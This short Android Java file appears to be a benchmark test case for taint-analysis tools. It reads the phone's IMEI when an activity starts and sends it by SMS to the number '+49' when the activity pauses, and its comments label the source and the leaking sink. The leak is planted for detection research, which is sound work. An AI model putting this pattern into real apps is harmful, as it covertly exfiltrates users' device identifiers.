package de.ecspride;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MyApplication extends Application {

    private final class ApplicationCallbacks implements ActivityLifecycleCallbacks {

        String imei;

        @Override
        public void onActivityStopped(Activity activity) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onActivityStarted(Activity activity) {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            // source
            imei = telephonyManager.getDeviceId();
        }

        @Override
        public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onActivityResumed(Activity activity) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onActivityPaused(Activity activity) {
            SmsManager sms = SmsManager.getDefault();
            // sink, leak
            sms.sendTextMessage("+49", null, imei, null, null);
        }

        @Override
        public void onActivityDestroyed(Activity activity) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
        }
    }

    ActivityLifecycleCallbacks callbacks = new ApplicationCallbacks();

    @Override
    public void onTerminate() {
        this.unregisterActivityLifecycleCallbacks(callbacks);
    }
}
